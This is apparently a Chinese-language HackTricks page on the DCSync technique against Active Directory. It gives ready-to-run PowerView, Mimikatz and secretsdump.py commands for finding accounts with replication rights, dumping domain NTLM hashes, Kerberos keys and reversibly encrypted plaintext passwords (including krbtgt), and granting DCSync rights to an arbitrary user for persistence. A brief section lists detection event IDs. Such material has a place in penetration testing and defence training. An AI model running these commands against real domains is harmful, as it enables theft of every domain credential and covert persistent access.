# DCSync

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
使用 [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) 可以轻松构建和 **自动化工作流程**，使用全球 **最先进** 的社区工具。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 HackTricks 中看到您的 **公司广告** 或 **下载 PDF 版本的 HackTricks**，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 探索 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注** 我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* 通过向 **HackTricks** 和 **HackTricks Cloud** 的 github 仓库提交 PR 来分享您的黑客技巧。

</details>

## DCSync

**DCSync** 权限意味着对域本身具有以下权限：**DS-Replication-Get-Changes**、**Replicating Directory Changes All** 和 **Replicating Directory Changes In Filtered Set**。

**关于 DCSync 的重要说明:**

* **DCSync 攻击模拟域控制器的行为，并要求其他域控制器使用目录复制服务远程协议 (MS-DRSR) 复制信息**。由于 MS-DRSR 是 Active Directory 的有效且必要功能，因此无法关闭或禁用。
* 默认情况下，只有 **域管理员、企业管理员、管理员和域控制器** 组具有所需的特权。
* 如果任何帐户密码以可逆加密方式存储，Mimikatz 中有一个选项可以返回明文密码

### 枚举

使用 `powerview` 检查具有这些权限的用户：
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### 本地利用
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### 远程利用
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` 生成3个文件：

* 一个包含 **NTLM哈希值** 的文件
* 一个包含 **Kerberos密钥** 的文件
* 一个包含启用了[**可逆加密**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption)的NTDS中的明文密码的文件。您可以使用以下命令获取启用了可逆加密的用户：

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### 持久性

如果您是域管理员，可以使用 `powerview` 来将这些权限授予任何用户：
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
然后，您可以**检查用户是否正确分配**这3个特权，通过查找它们在输出中的名称（您应该能够在"ObjectType"字段中看到特权的名称）：
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### 缓解措施

* 安全事件 ID 4662（必须启用对象的审核策略）– 对对象执行了操作
* 安全事件 ID 5136（必须启用对象的审核策略）– 修改了目录服务对象
* 安全事件 ID 4670（必须启用对象的审核策略）– 更改了对象的权限
* AD ACL Scanner - 创建和比较 ACL 的创建报告。[https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## 参考资料

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
* [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS 红队专家）</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 HackTricks 中看到您的 **公司广告** 或 **下载 PDF 版本的 HackTricks**，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 探索 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家 [**NFT**](https://opensea.io/collection/the-peass-family) 收藏品
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注** 我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向 **HackTricks** 和 **HackTricks Cloud** 的 github 仓库提交 PR 来分享您的黑客技巧。

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
使用 [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) 可以轻松构建和 **自动化** 工作流程，使用世界上 **最先进** 的社区工具。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
